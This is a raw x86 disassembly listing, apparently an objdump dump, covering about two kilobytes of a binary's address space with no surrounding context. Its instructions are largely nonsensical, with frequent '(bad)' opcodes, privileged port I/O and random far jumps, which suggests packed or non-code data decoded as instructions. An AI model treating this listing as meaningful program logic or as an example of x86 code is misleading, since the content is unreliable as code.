  40193e:	lods   al,BYTE PTR ds:[esi]
  40193f:	jmp    0xdd583513
  401944:	das    
  401945:	hlt    
  401946:	hlt    
  401947:	mov    esp,0xd2fcf1f3
  40194c:	fsubr  DWORD PTR [esi]
  40194e:	mov    bh,BYTE PTR [ebx+ebx*1]
  401951:	sub    bl,BYTE PTR [edi]
  401953:	cli    
  401954:	mov    edx,0xcb8be01d
  401959:	shl    DWORD PTR [eax+0x1ad79b79],cl
  40195f:	adc    al,0x6f
  401961:	xchg   edi,eax
  401962:	retf   0xbd00
  401965:	push   cs
  401966:	push   ss
  401967:	shl    BYTE PTR [ebx+0x4e],1
  40196a:	cmp    esp,ebp
  40196c:	lea    ebp,[esi]
  40196e:	imul   BYTE PTR [ebp+0x6b]
  401971:	xchg   edi,eax
  401972:	outs   dx,BYTE PTR ds:[esi]
  401973:	mov    dh,0xf5
  401975:	sahf   
  401976:	xor    BYTE PTR [ecx+esi*8],dh
  401979:	sub    ecx,DWORD PTR ds:0xe046d06c
  40197f:	cdq    
  401980:	out    dx,eax
  401981:	sti    
  401982:	mov    eax,0x20f9dd38
  401987:	dec    ebp
  401988:	outs   dx,BYTE PTR ds:[esi]
  401989:	push   ebp
  40198a:	cmp    ebp,DWORD PTR [edx+eax*2-0x785b3a1a]
  401991:	loope  0x4019b1
  401993:	int    0xa9
  401995:	repz loop 0x401970
  401998:	mov    dh,0xa4
  40199a:	adc    al,0xb8
  40199c:	push   0x27
  40199e:	inc    ecx
  40199f:	nop
  4019a0:	clc    
  4019a1:	xchg   esi,eax
  4019a2:	mov    BYTE PTR [esi],cl
  4019a4:	jmpw   0xcde1
  4019a8:	(bad)  
  4019aa:	mov    ebp,0xfce1d47b
  4019af:	inc    ebp
  4019b0:	ret    0x3fec
  4019b3:	fdiv   QWORD PTR [edx]
  4019b5:	cld    
  4019b6:	(bad)  [ebp-0x35]
  4019b9:	push   edi
  4019ba:	cmp    eax,0x28972e25
  4019bf:	clc    
  4019c0:	sbb    DWORD PTR [esp+edx*8+0x62ea65d0],0x9c160999
  4019cb:	mov    ds:0x4ccf5afe,al
  4019d0:	mov    ecx,0xd29505c7
  4019d5:	pop    ecx
  4019d6:	sbb    DWORD PTR [ebp-0x76],ecx
  4019d9:	add    DWORD PTR [esi+0x1a],ecx
  4019dc:	push   0x12f1f6fd
  4019e1:	push   edx
  4019e2:	pop    esp
  4019e3:	loop   0x4019b3
  4019e5:	out    dx,al
  4019e6:	jg     0x401a67
  4019e8:	xor    BYTE PTR [ebp-0x92fe385],bl
  4019ee:	add    esp,DWORD PTR [ecx+0x40]
  4019f1:	lods   al,BYTE PTR ds:[esi]
  4019f2:	scas   eax,DWORD PTR es:[edi]
  4019f3:	mov    ah,0xfb
  4019f5:	cmp    esp,DWORD PTR [ebp+0x160435af]
  4019fb:	sbb    BYTE PTR [esi],al
  4019fd:	setae  BYTE PTR ds:0x405d6998
  401a04:	shr    DWORD PTR [ebx-0x7853bd47],cl
  401a0a:	dec    ecx
  401a0b:	sub    al,0xa1
  401a0d:	outs   dx,BYTE PTR ds:[esi]
  401a0e:	add    eax,DWORD PTR [ecx-0x23]
  401a11:	xor    bh,dh
  401a13:	(bad)  
  401a14:	ret    
  401a15:	or     eax,DWORD PTR [ebx-0x69]
  401a18:	ret    
  401a19:	or     ebx,edi
  401a1b:	mov    ch,0x7
  401a1d:	pop    eax
  401a1e:	or     dh,BYTE PTR [eax]
  401a20:	test   DWORD PTR [ebp-0x6d381808],eax
  401a26:	cmp    BYTE PTR [edx+eiz*4-0x47],dl
  401a2a:	or     esi,DWORD PTR [edi-0x3ecefaf8]
  401a30:	out    0x73,eax
  401a32:	in     al,dx
  401a33:	sti    
  401a34:	test   al,0x8a
  401a36:	inc    esp
  401a37:	mov    ch,0x86
  401a39:	test   eax,0xf65e20be
  401a3e:	in     eax,0xac
  401a40:	sbb    eax,0xa637f42d
  401a45:	retf   
  401a46:	adc    eax,DWORD PTR [ecx]
  401a48:	shl    DWORD PTR [ecx],0x90
  401a4b:	cdq    
  401a4c:	loopne 0x401a27
  401a4e:	call   0x14ed93be
  401a53:	mov    ah,0x46
  401a55:	adc    al,0xf6
  401a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a59:	and    dl,ah
  401a5b:	imul   ebp,DWORD PTR [eax+eiz*2],0xffffffc0
  401a5f:	imul   ecx,DWORD PTR [edi-0x7c],0xe31f03dd
  401a66:	in     eax,0x48
  401a68:	or     al,0x82
  401a6a:	xlat   BYTE PTR ds:[ebx]
  401a6b:	sbb    bl,bh
  401a6d:	call   DWORD PTR [edi+0x5a]
  401a70:	rol    DWORD PTR [edx-0x1bd8a694],cl
  401a76:	mov    WORD PTR [eax],ds
  401a78:	mov    DWORD PTR [eax+0x5a],ebx
  401a7b:	fldcw  WORD PTR [ecx]
  401a7d:	ins    BYTE PTR es:[edi],dx
  401a7e:	stos   BYTE PTR es:[edi],al
  401a7f:	leave  
  401a80:	hlt    
  401a81:	mov    esi,0x7085a196
  401a86:	popa   
  401a87:	adc    eax,0x381e5b24
  401a8c:	arpl   WORD PTR [esi-0x57],sp
  401a8f:	and    edi,DWORD PTR [esi]
  401a91:	inc    esi
  401a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a93:	ss sbb ebx,edx
  401a96:	(bad)  
  401a97:	sbb    bh,al
  401a99:	inc    ebx
  401a9a:	pushf  
  401a9b:	shl    DWORD PTR [esi-0x46],cl
  401a9e:	pop    es
  401a9f:	(bad)  
  401aa0:	(bad)  
  401aa1:	ss and al,0xe8
  401aa4:	xchg   BYTE PTR ds:[ebx-0x6a727ba4],ah
  401aab:	and    bh,BYTE PTR [ecx]
  401aad:	xchg   edi,eax
  401aae:	add    dl,BYTE PTR [edi]
  401ab0:	sub    DWORD PTR [edi],ebx
  401ab2:	jo     0x401b10
  401ab4:	push   ds
  401ab5:	(bad)  
  401ab7:	jno    0x401a5b
  401ab9:	jno    0x401b33
  401abb:	iret   
  401abc:	retf   
  401abd:	push   ds
  401abe:	push   esi
  401abf:	sub    esp,0x70a2894a
  401ac5:	ror    BYTE PTR [edi-0x22],0x3b
  401ac9:	mov    dh,0x23
  401acb:	mov    ebp,0x27045035
  401ad0:	dec    esi
  401ad1:	sbb    eax,eax
  401ad3:	aam    0x55
  401ad5:	pop    edx
  401ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad7:	pmulhw mm1,QWORD PTR [ebx]
  401ada:	fidivr WORD PTR [ecx-0x5798c65d]
  401ae0:	int3   
  401ae1:	add    ecx,DWORD PTR [eax]
  401ae3:	shl    DWORD PTR [ecx],0x63
  401ae6:	sub    eax,0x648ff1fc
  401aeb:	adc    esi,ecx
  401aed:	repnz mov edi,DWORD PTR [eax+0x69]
  401af1:	sub    dl,BYTE PTR [ebx+edx*1+0x1d04ef7b]
  401af8:	ins    BYTE PTR es:[edi],dx
  401af9:	data16 mov BYTE PTR [esi],dl
  401afc:	or     al,0x59
  401afe:	test   al,0x37
  401b00:	fnstcw WORD PTR [edi]
  401b02:	xchg   BYTE PTR [ebx+0x60],dh
  401b05:	lds    ecx,FWORD PTR [ebp-0x10fd7942]
  401b0b:	mov    dl,0x14
  401b0d:	pop    ds
  401b0e:	cmp    al,0x2c
  401b10:	inc    edi
  401b11:	or     ecx,DWORD PTR [edx+ebp*8-0x4c]
  401b15:	push   ss
  401b16:	jno    0x401ae1
  401b18:	(bad)  
  401b19:	push   ebp
  401b1a:	sub    eax,0x9b2282ea
  401b1f:	in     al,dx
  401b20:	arpl   WORD PTR [ebx-0x156574f0],di
  401b26:	pop    edi
  401b27:	enter  0xb1fe,0x44
  401b2b:	mov    edi,0x1bfc6b3a
  401b30:	imul   eax,DWORD PTR [eax+0x299fbe1f],0xf6bd5a6b
  401b3a:	dec    eax
  401b3b:	jae    0x401b04
  401b3d:	and    BYTE PTR [eax+eax*2-0xb],bh
  401b41:	(bad)  
  401b43:	repnz adc BYTE PTR gs:[ebx+0x6d],dh
  401b48:	(bad)  
  401b49:	sbb    al,0x4c
  401b4b:	and    al,0xa7
  401b4d:	or     dh,cl
  401b4f:	dec    ebp
  401b50:	in     eax,0x74
  401b52:	cld    
  401b53:	adc    bl,dl
  401b55:	lahf   
  401b56:	push   ebx
  401b57:	dec    ecx
  401b58:	out    dx,eax
  401b59:	add    BYTE PTR [esi+0x63],ah
  401b5c:	ret    
  401b5d:	adc    BYTE PTR [esi],0x33
  401b60:	dec    ebx
  401b61:	or     bl,BYTE PTR [ebx+esi*4-0x47]
  401b65:	outs   dx,BYTE PTR ds:[esi]
  401b66:	das    
  401b67:	mov    ebx,0x2d0f9980
  401b6c:	dec    esp
  401b6d:	nop
  401b6e:	jge    0x401b18
  401b70:	dec    edx
  401b71:	test   DWORD PTR [edi-0x17],edi
  401b74:	je     0x401be7
  401b76:	add    bh,BYTE PTR [edi+0x7219b064]
  401b7c:	xlat   BYTE PTR ds:[ebx]
  401b7d:	fst    DWORD PTR [eax-0x28]
  401b80:	dec    esi
  401b81:	xchg   ebp,eax
  401b82:	call   0x8b7d435b
  401b87:	cli    
  401b88:	je     0x401b99
  401b8a:	(bad)  
  401b8b:	mov    ch,0x3
  401b8d:	sti    
  401b8e:	test   BYTE PTR [ebp+0x1549ad32],bh
  401b94:	mov    al,0x92
  401b96:	pusha  
  401b97:	cmc    
  401b98:	mov    esi,0x6fde826c
  401b9d:	add    DWORD PTR [ecx+0xc120684],ebp
  401ba3:	cld    
  401ba4:	mov    bl,0xe4
  401ba6:	mov    bl,0x9c
  401ba8:	xchg   esi,eax
  401ba9:	or     al,0xc3
  401bab:	mov    ebx,0x3a8d8773
  401bb0:	adc    ecx,DWORD PTR [ebx-0x2ceefcc8]
  401bb6:	aaa    
  401bb7:	jmp    DWORD PTR [edi+0x7d4a35e5]
  401bbd:	(bad)  
  401bbe:	lock xor al,0x0
  401bc1:	inc    ecx
  401bc2:	leave  
  401bc3:	xchg   esi,eax
  401bc4:	lock push ebx
  401bc6:	lea    edx,[eax]
  401bc8:	ja     0x401b56
  401bca:	mov    ds:0x2ea06f89,eax
  401bcf:	or     BYTE PTR [ebx],dh
  401bd1:	adc    edx,DWORD PTR [edx+0x74]
  401bd4:	xor    esp,DWORD PTR [edx+eax*1]
  401bd7:	mov    ds:0x98116dc5,eax
  401bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bdd:	in     al,dx
  401bde:	in     eax,0x21
  401be0:	inc    ebx
  401be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be2:	mov    cl,0xce
  401be4:	xchg   edi,eax
  401be5:	xor    BYTE PTR [ecx-0x28],bl
  401be8:	aad    0xbe
  401bea:	aaa    
  401beb:	hlt    
  401bec:	add    eax,0xfeb5bb2
  401bf1:	dec    edx
  401bf2:	cli    
  401bf3:	sub    al,0xb9
  401bf5:	add    ebx,DWORD PTR [ebx+0x1c6997b7]
  401bfb:	push   esi
  401bfc:	mov    dh,0xaa
  401bfe:	sbb    eax,0xd17a6110
  401c03:	outs   dx,DWORD PTR ds:[esi]
  401c04:	(bad)  
  401c06:	xor    eax,0x753f6868
  401c0b:	sub    DWORD PTR [eax-0x6e],esp
  401c0e:	xchg   edx,eax
  401c0f:	pop    ecx
  401c10:	cli    
  401c11:	(bad)  
  401c12:	fcomp  QWORD PTR [ebx]
  401c14:	adc    DWORD PTR [ecx],esp
  401c16:	xor    al,0x8b
  401c18:	adc    al,BYTE PTR [ecx+0x60ee3c06]
  401c1e:	es dec ebp
  401c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c21:	push   cs
  401c22:	sub    al,BYTE PTR [edi+0x53]
  401c25:	xchg   ebx,eax
  401c26:	xchg   edx,eax
  401c27:	shl    ebx,cl
  401c29:	adc    BYTE PTR [ebx+0x39eb1dbb],al
  401c2f:	arpl   WORD PTR [eax+0x71],ax
  401c32:	push   edx
  401c33:	arpl   WORD PTR [ebx+0x639d3766],sp
  401c39:	and    DWORD PTR [ecx],0x53
  401c3c:	jns    0x401bed
  401c3e:	pop    ebp
  401c3f:	aad    0x74
  401c41:	cwde   
  401c42:	addr16 lahf 
  401c44:	je     0x401c4d
  401c46:	pop    ss
  401c47:	int3   
  401c48:	or     BYTE PTR [edi],bl
  401c4a:	loop   0x401c98
  401c4c:	jecxz  0x401cba
  401c4e:	pop    edi
  401c4f:	sar    DWORD PTR [edx],cl
  401c51:	and    DWORD PTR [ecx],eax
  401c53:	ins    DWORD PTR es:[edi],dx
  401c54:	add    eax,0x5154bfcd
  401c59:	add    DWORD PTR [esi],esp
  401c5b:	add    bh,BYTE PTR [ebx+ecx*4+0x4c]
  401c5f:	push   0x4d
  401c61:	lods   eax,DWORD PTR ds:[esi]
  401c62:	and    al,0xd5
  401c64:	dec    ebx
  401c65:	(bad)
  401c68:	fisttp WORD PTR [ecx-0x764294b5]
  401c6e:	mov    ch,0x1a
  401c70:	sub    eax,0x9d9deaf4
  401c75:	not    BYTE PTR [edi]
  401c77:	clc    
  401c78:	xor    al,0xbd
  401c7a:	inc    esp
  401c7b:	xor    BYTE PTR [esi-0x47eb7e7],cl
  401c81:	cs (bad) 
  401c83:	adc    BYTE PTR [ecx-0xb],dl
  401c86:	sub    eax,0x1549229b
  401c8b:	vpunpckhbw ymm4,ymm4,YMMWORD PTR ds:0x26ac6fa
  401c93:	outs   dx,DWORD PTR ds:[esi]
  401c94:	popf   
  401c95:	test   ebx,edx
  401c97:	sub    edi,DWORD PTR [edi+edx*1-0x69]
  401c9b:	inc    edx
  401c9c:	adc    BYTE PTR [ecx],cl
  401c9e:	test   BYTE PTR [edx],bh
  401ca0:	btr    DWORD PTR [esi],esp
  401ca3:	mov    eax,0x6a94c008
  401ca8:	mov    DWORD PTR [edx],ecx
  401caa:	fisubr DWORD PTR [ebp+0x7a]
  401cad:	fcmovne st,st(2)
  401caf:	pop    ss
  401cb0:	or     dh,BYTE PTR [ebp+0x76]
  401cb3:	and    BYTE PTR [ebx+0x5827bfe6],cl
  401cb9:	fadd   QWORD PTR [edi-0x318ad978]
  401cbf:	pop    edx
  401cc0:	dec    ecx
  401cc1:	adc    al,0x2
  401cc3:	inc    edi
  401cc4:	inc    dl
  401cc6:	loop   0x401ce8
  401cc8:	dec    ecx
  401cc9:	cwde   
  401cca:	fs mov bl,0x70
  401ccd:	outs   dx,BYTE PTR ds:[esi]
  401cce:	xchg   DWORD PTR [esi],edi
  401cd0:	sbb    bl,BYTE PTR [ebx+ebx*2]
  401cd3:	xchg   edx,eax
  401cd4:	lods   eax,DWORD PTR ds:[esi]
  401cd5:	std    
  401cd6:	out    0xf4,eax
  401cd8:	sahf   
  401cd9:	sub    al,0x11
  401cdb:	bound  edx,QWORD PTR [ebx+eax*4+0x1]
  401cdf:	cli    
  401ce0:	xor    ebx,edi
  401ce2:	ficomp DWORD PTR [ebp+0x51]
  401ce5:	cwd    
  401ce7:	mov    ecx,0xfd39d472
  401cec:	sbb    al,0x95
  401cee:	or     eax,0xe6d89f93
  401cf3:	mov    BYTE PTR [edi],bl
  401cf5:	arpl   WORD PTR [esi+0x10069e99],bp
  401cfb:	dec    esp
  401cfc:	into   
  401cfd:	sub    al,0xdf
  401cff:	retf   
  401d00:	aam    0x4c
  401d02:	dec    esp
  401d03:	imul   edi,eax,0x72
  401d06:	cdq    
  401d07:	mov    dl,0xad
  401d09:	adc    BYTE PTR [ecx-0x606cf82c],0xad
  401d10:	dec    ebp
  401d11:	push   esp
  401d12:	shl    DWORD PTR [edi+edi*4],0xe6
  401d16:	stos   DWORD PTR es:[edi],eax
  401d17:	pop    esi
  401d18:	xor    BYTE PTR [edi],0x63
  401d1b:	repnz bound esi,QWORD PTR [edx+0x33]
  401d1f:	stc    
  401d20:	sub    ch,BYTE PTR [ebp-0x7a]
  401d23:	jl     0x401d6c
  401d25:	(bad)  
  401d26:	or     DWORD PTR [edi-0x4dc89f0a],ebx
  401d2c:	and    eax,0xb764372
  401d31:	iret   
  401d32:	mov    esp,0x4505c1c0
  401d37:	(bad)  
  401d39:	call   0x1425:0x39ee0a0e
  401d40:	xchg   ecx,eax
  401d41:	sub    al,0xeb
  401d43:	adc    eax,0xccbab7f8
  401d48:	test   eax,0xe96d525b
  401d4d:	push   edi
  401d4e:	ds test eax,0x460942ee
  401d54:	leave  
  401d55:	fist   WORD PTR [ebx+0x71]
  401d58:	inc    eax
  401d59:	or     al,0xf3
  401d5b:	jnp    0x401d58
  401d5d:	sahf   
  401d5e:	inc    edx
  401d5f:	shl    BYTE PTR [eax-0x693ee841],0x71
  401d66:	sbb    DWORD PTR [edx],edx
  401d68:	pop    es
  401d69:	inc    ebp
  401d6a:	fistp  DWORD PTR [edx+esi*8]
  401d6d:	push   edx
  401d6e:	lock into 
  401d70:	shl    BYTE PTR ds:0xf6c1dcd0,0x99
  401d77:	jbe    0x401d3f
  401d79:	int    0xc3
  401d7b:	call   0x10dc:0x628fb80e
  401d82:	cmp    ebx,ebx
  401d84:	dec    esi
  401d85:	xor    DWORD PTR [ecx+eax*1-0x6c6445eb],esi
  401d8c:	mov    eax,0x8eb85d22
  401d91:	adc    eax,0x5356213c
  401d96:	lea    eax,[ecx-0x3afae3b]
  401d9c:	in     al,dx
  401d9d:	add    DWORD PTR ds:[ebx+0x29c1a19f],esi
  401da4:	push   ds
  401da5:	jl     0x401d49
  401da7:	jecxz  0x401d51
  401da9:	retf   0x25cb
  401dac:	jbe    0x401d53
  401dae:	cld    
  401daf:	push   esp
  401db0:	jo     0x401d4f
  401db2:	imul   esp,DWORD PTR [edx-0x34e8c020],0xd12be90
  401dbc:	adc    esp,edx
  401dbe:	mov    ss,ecx
  401dc0:	or     al,0xe9
  401dc2:	mov    gs,WORD PTR [edx]
  401dc4:	out    dx,eax
  401dc5:	imul   esi,DWORD PTR [edx+edx*2-0x30],0x21
  401dca:	xlat   BYTE PTR ds:[ebx]
  401dcb:	sbb    ch,cl
  401dcd:	mov    ds:0x519533f5,al
  401dd2:	mov    ah,0x29
  401dd4:	test   al,0xf
  401dd6:	leave  
  401dd7:	scas   eax,DWORD PTR es:[edi]
  401dd8:	das    
  401dd9:	sbb    al,0x50
  401ddb:	cmp    al,0xd2
  401ddd:	aam    0xff
  401ddf:	adc    BYTE PTR [ebp+0x4f],bh
  401de2:	or     eax,0x9665309a
  401de7:	jne    0x401d73
  401de9:	fist   DWORD PTR [esi]
  401deb:	inc    ecx
  401dec:	hlt    
  401ded:	mov    ebx,0x98e056dc
  401df2:	ins    BYTE PTR es:[edi],dx
  401df3:	dec    ebx
  401df4:	lds    ebp,FWORD PTR ds:[ebp-0x5632ad69]
  401dfb:	dec    esp
  401dfc:	scas   al,BYTE PTR es:[edi]
  401dfd:	dec    esp
  401dfe:	je     0x401df5
  401e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e01:	xor    esi,ecx
  401e03:	mov    dl,0xba
  401e05:	loopne 0x401e5f
  401e07:	into   
  401e08:	(bad)  
  401e09:	test   al,0x31
  401e0b:	repnz cmp BYTE PTR [ebx+ebx*4+0x397d4397],0xc8
  401e14:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401e16:	cmp    eax,0xaba3df4b
  401e1b:	cli    
  401e1c:	inc    edx
  401e1d:	aas    
  401e1e:	or     BYTE PTR [ebp+0x50818a33],bl
  401e24:	mov    ecx,0xb756c3ff
  401e29:	gs xchg ebx,eax
  401e2b:	into   
  401e2c:	xchg   BYTE PTR [edi+0x16],bl
  401e2f:	sbb    bl,BYTE PTR [eax]
  401e31:	push   es
  401e32:	pop    es
  401e33:	outs   dx,BYTE PTR ds:[esi]
  401e34:	wbinvd 
  401e36:	clc    
  401e37:	mov    BYTE PTR [edx-0x62c4a044],ch
  401e3d:	test   bh,0xa
  401e40:	xchg   ebx,eax
  401e41:	pop    esp
  401e42:	shl    BYTE PTR ds:0xe82fa245,1
  401e48:	test   BYTE PTR [edx+edi*4-0x4b],ch
  401e4c:	mov    eax,0x7002e0ad
  401e51:	xchg   ebx,eax
  401e52:	hlt    
  401e53:	dec    ecx
  401e54:	adc    dl,ch
  401e56:	xchg   ecx,eax
  401e57:	push   eax
  401e58:	or     ebp,DWORD PTR [eax+0x63faf963]
  401e5e:	pop    ebp
  401e5f:	add    dh,BYTE PTR [edi-0x7d]
  401e62:	mov    ecx,0x8efb411f
  401e67:	neg    BYTE PTR [edi]
  401e69:	mov    bh,0x82
  401e6b:	dec    esi
  401e6c:	xchg   esi,eax
  401e6d:	cmp    DWORD PTR [esi],ebp
  401e6f:	pop    edx
  401e70:	out    0x52,al
  401e72:	icebp  
  401e73:	lods   al,BYTE PTR ds:[esi]
  401e74:	in     eax,0x26
  401e76:	and    bh,BYTE PTR [eax+0x50]
  401e79:	jl     0x401e26
  401e7b:	mov    cl,BYTE PTR [ebp+0x65094bfd]
  401e81:	out    0x3f,al
  401e83:	cmc    
  401e84:	sub    BYTE PTR [ecx+0x71],cl
  401e87:	dec    eax
  401e88:	out    0x1a,al
  401e8a:	icebp  
  401e8b:	mov    ebx,DWORD PTR [ebx+0x1c]
  401e8e:	popf   
  401e8f:	sub    eax,0xcfa7c76d
  401e94:	pop    ds
  401e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e96:	adc    al,0x9f
  401e98:	xchg   edx,eax
  401e99:	mul    BYTE PTR [esi-0x6c]
  401e9c:	push   cs
  401e9d:	cmp    esi,eax
  401e9f:	rcl    cl,0xd4
  401ea2:	push   ebp
  401ea3:	and    dh,BYTE PTR [eax+edi*8-0x24]
  401ea7:	pusha  
  401ea8:	hlt    
  401ea9:	popf   
  401eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eab:	sbb    bh,BYTE PTR [edx+0x28]
  401eae:	jge    0x401eee
  401eb0:	int    0x72
  401eb2:	imul   BYTE PTR [edx]
  401eb4:	call   0x4c9d:0xc11666b2
  401ebb:	cmp    ah,BYTE PTR [ebp-0x16]
  401ebe:	and    al,0x49
  401ec0:	sbb    DWORD PTR ds:0xb0d20380,0x31bfdf26
  401eca:	jge    0x401f1b
  401ecc:	jns    0x401ed1
  401ece:	dec    ecx
  401ecf:	push   0x7f
  401ed1:	mov    ah,0xd0
  401ed3:	jmp    0xd2fd:0x7285d4d7
  401eda:	mov    gs,WORD PTR cs:[ebx-0x51]
  401ede:	ret    
  401edf:	mov    ebx,0x4742f01b
  401ee4:	dec    edi
  401ee5:	cmp    eax,0x7995e555
  401eea:	mov    eax,ds:0x439c2c20
  401eef:	add    BYTE PTR [ebx-0x44],cl
  401ef2:	mov    ah,0xd4
  401ef4:	mov    ss,esi
  401ef6:	jnp    0x401f3d
  401ef8:	mov    ?,WORD PTR [esi+0x46]
  401efb:	dec    edx
  401efc:	dec    edi
  401efd:	xor    al,0x15
  401eff:	imul   ecx,DWORD PTR [esi],0x26
  401f02:	dec    edi
  401f03:	in     eax,dx
  401f04:	popa   
  401f05:	aam    0xf
  401f07:	fxam   
  401f09:	mov    ah,0x63
  401f0b:	sbb    DWORD PTR [eax],edi
  401f0d:	xchg   edx,eax
  401f0e:	add    eax,0x669386e5
  401f13:	(bad)  
  401f15:	pop    edx
  401f16:	popa   
  401f17:	or     bl,BYTE PTR [edx-0x32]
  401f1a:	fcom   DWORD PTR [esi]
  401f1c:	xchg   bl,bl
  401f1e:	popf   
  401f1f:	mov    al,0x20
  401f21:	cs jb  0x401f54
  401f24:	mov    DWORD PTR [eax-0x54a3ff63],edx
  401f2a:	cli    
  401f2b:	rol    BYTE PTR [ebx+esi*1+0x6e500cb],0x33
  401f33:	cmp    BYTE PTR [edx+0x5e8d090c],al
  401f39:	ja     0x401ee0
  401f3b:	or     BYTE PTR [esi+ebx*2],0x6f
  401f3f:	inc    esp
  401f40:	sub    ah,bl
  401f42:	xchg   ebp,eax
  401f43:	dec    DWORD PTR [edi]
  401f45:	xor    eax,0x91e3be04
  401f4a:	repnz sub eax,ecx
  401f4d:	pop    ss
  401f4e:	fld    TBYTE PTR [ebp+0x18]
  401f51:	mov    ebx,0x7ec4548c
  401f56:	rcl    BYTE PTR [ebp-0xdf27d1],1
  401f5c:	loopne 0x401ef1
  401f5e:	les    ebp,FWORD PTR [edi]
  401f60:	or     BYTE PTR [edi+0x17],cl
  401f63:	or     eax,0x45b9e37f
  401f68:	jbe    0x401f19
  401f6a:	fstp   TBYTE PTR [edi+0x20761bc5]
  401f70:	arpl   si,di
  401f72:	ret    
  401f73:	sbb    BYTE PTR [edi],bl
  401f75:	cmp    ebp,DWORD PTR [edx-0x7cf2da30]
  401f7b:	jo     0x401fde
  401f7d:	inc    ebp
  401f7e:	and    edx,0x235ac7dd
  401f84:	inc    ecx
  401f85:	dec    ebx
  401f86:	out    dx,eax
  401f87:	adc    BYTE PTR [ebx+0x12],ch
  401f8a:	les    eax,FWORD PTR [edi+0x72]
  401f8d:	lods   eax,DWORD PTR ds:[esi]
  401f8e:	aad    0x1e
  401f90:	stc    
  401f91:	pop    ebx
  401f92:	inc    ebx
  401f93:	pop    eax
  401f94:	lock in al,0x3c
  401f97:	sub    al,0x99
  401f99:	ret    
  401f9a:	ja     0x401f8e
  401f9c:	push   eax
  401f9d:	aam    0xf1
  401f9f:	outs   dx,BYTE PTR ds:[esi]
  401fa0:	or     dh,BYTE PTR [edx-0x4ff5fa35]
  401fa6:	scas   eax,DWORD PTR es:[edi]
  401fa7:	nop
  401fa8:	dec    esp
  401fa9:	push   cs
  401faa:	pop    ss
  401fab:	cmp    esi,ecx
  401fad:	dec    ebx
  401fae:	outs   dx,BYTE PTR ds:[esi]
  401faf:	cdq    
  401fb0:	das    
  401fb1:	push   esp
  401fb2:	ins    DWORD PTR es:[edi],dx
  401fb3:	pop    ecx
  401fb4:	and    DWORD PTR [ebx+esi*8],edi
  401fb7:	(bad)  
  401fb8:	push   esi
  401fb9:	mov    ch,0xd7
  401fbb:	jp     0x401f7e
  401fbd:	mov    al,0x16
  401fbf:	mov    ebp,DWORD PTR gs:[edx+ecx*8-0x14]
  401fc4:	les    edi,FWORD PTR [edx]
  401fc6:	loop   0x401fb4
  401fc8:	sub    eax,0x6f99b46d
  401fcd:	cmp    al,0xc7
  401fcf:	aad    0x50
  401fd1:	nop
  401fd2:	add    BYTE PTR [ebx-0x58],0xbf
  401fd6:	mov    WORD PTR [ebx],cs
  401fd8:	adc    edi,0x61
  401fdb:	jmp    0x401fc7
  401fdd:	push   ebp
  401fde:	jns    0x401f93
  401fe0:	xchg   BYTE PTR [edx+0x62],ah
  401fe3:	mov    esi,0xb768c9e8
  401fe8:	inc    esi
  401fe9:	scas   eax,DWORD PTR es:[edi]
  401fea:	jne    0x401f94
  401fec:	jb     0x402025
  401fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fef:	stos   BYTE PTR es:[edi],al
  401ff0:	mov    ah,0x85
  401ff2:	std    
  401ff3:	or     edi,DWORD PTR [edx+0x4346cde]
  401ff9:	push   edi
  401ffa:	push   edx
  401ffb:	jno    0x402034
  401ffd:	(bad)  
  401ffe:	mov    ecx,edi
  402000:	out    0xbe,al
  402002:	popa   
  402003:	sbb    BYTE PTR [eax],0xe8
  402006:	outs   dx,BYTE PTR ds:[esi]
  402007:	jbe    0x401ff7
  402009:	sub    al,0xc
  40200b:	das    
  40200c:	add    al,0xaf
  40200e:	add    ebx,DWORD PTR [ebx]
  402010:	xor    edx,DWORD PTR [edi]
  402012:	call   0x61ca:0x652a27b2
  402019:	cli    
  40201a:	adc    eax,0x5ec95274
  40201f:	pop    es
  402020:	or     ebp,ebx
  402022:	jns    0x401fd4
  402024:	sub    al,0x45
  402026:	retf   0xac8
  402029:	js     0x401ffb
  40202b:	pop    esp
  40202c:	sti    
  40202d:	leave  
  40202e:	mov    edx,0x9a4076ee
  402033:	pop    ds
  402034:	leave  
  402035:	sbb    eax,0x832175c7
  40203a:	mov    edx,0xd6807f3c
  40203f:	enter  0xc908,0x54
  402043:	and    al,0x82
  402045:	xchg   ecx,eax
  402046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402047:	mov    dh,0x84
  402049:	dec    edx
  40204a:	loope  0x402094
  40204c:	dec    edi
  40204d:	leave  
  40204e:	shl    DWORD PTR [esi],cl
  402050:	mov    cs,WORD PTR [ebx-0xfc60a74]
  402056:	in     eax,dx
  402057:	mov    esi,ss
  402059:	adc    al,0x96
  40205b:	popf   
  40205c:	outs   dx,BYTE PTR ds:[esi]
  40205d:	sti    
  40205e:	or     BYTE PTR [ebx+0x14c8b042],cl
  402064:	fstp   QWORD PTR [ecx+0x13542a30]
  40206a:	aam    0x7e
  40206c:	and    al,0xe8
  40206e:	frndint 
  402070:	std    
  402071:	sub    DWORD PTR [esi],edi
  402073:	mov    DWORD PTR [ebx+edx*2+0x10],esi
  402077:	xchg   esp,eax
  402078:	pusha  
  402079:	pop    edx
  40207a:	pop    es
  40207b:	in     eax,0x60
  40207d:	(bad)
  402081:	pop    ebp
  402082:	nop
  402083:	retf   0x7cf
  402086:	inc    ebp
  402087:	ja     0x40209b
  402089:	mov    eax,0xed14fbdf
  40208e:	mov    esi,0x501d0d36
  402093:	push   edi
  402094:	les    ebp,FWORD PTR es:[edi+0xf92fbf6]
  40209b:	imul   ebx,edx,0xfffffffe
  40209e:	in     al,0x9b
  4020a0:	pop    ebp
  4020a1:	out    0x3d,ax
  4020a4:	and    al,0x3a
  4020a6:	vmovapd xmm5,XMMWORD PTR [eax+edx*1-0x27c2a26a]
  4020af:	shl    BYTE PTR [edx+0x46],cl
  4020b2:	repnz ds fcmovnb st,st(0)
  4020b6:	jmp    0x7e9:0x8c1e0dde
